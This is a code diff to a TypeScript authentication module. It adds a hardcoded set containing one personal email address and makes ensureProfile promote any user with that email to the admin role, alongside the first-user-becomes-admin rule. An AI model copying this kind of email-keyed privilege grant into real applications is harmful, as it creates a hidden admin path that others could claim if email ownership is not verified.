@@ -32,6 +32,16 @@ export function canAdmin(role: Role): boolean {
   return role === "admin";
 }
 
+const SUPER_ADMIN_EMAILS = new Set(["md.akteruzzaman@gmail.com"]);
+
+async function lookupEmail(userId: string): Promise<string | null> {
+  const sql = await getSql();
+  const rows = await sql<{ email: string | null }>`
+    select email from "user" where id = ${userId}
+  `;
+  return rows[0]?.email ?? null;
+}
+
 export const optionalAuth = createMiddleware({ type: "function" })
   .client(async ({ next }) => {
     const { getBearerToken } = await import("@/lib/auth/client");
@@ -59,11 +69,19 @@ export async function ensureProfile(userId: string, email?: string | null): Prom
     `;
   }
 
+  const resolvedEmail = (email ?? (await lookupEmail(userId)))?.trim().toLowerCase() ?? "";
+  const isSuperAdmin = SUPER_ADMIN_EMAILS.has(resolvedEmail);
+
   const admins = await sql<{ n: number | string }>`
     select count(*)::int as n from profiles where role = 'admin'
   `;
   const adminCount = Number(admins[0]?.n ?? 0);
-  if (adminCount === 0) {
+
+  if (isSuperAdmin) {
+    await sql`
+      update profiles set role = 'admin' where user_id = ${userId}
+    `;
+  } else if (adminCount === 0) {
     await sql`
       update profiles set role = 'admin' where user_id = ${userId}
     `;
@@ -83,7 +101,6 @@ export async function ensureProfile(userId: string, email?: string | null): Prom
     select status from teacher_applications where user_id = ${userId}
   `;
 
-  void email;
   return {
     userId,
     role: row.role,
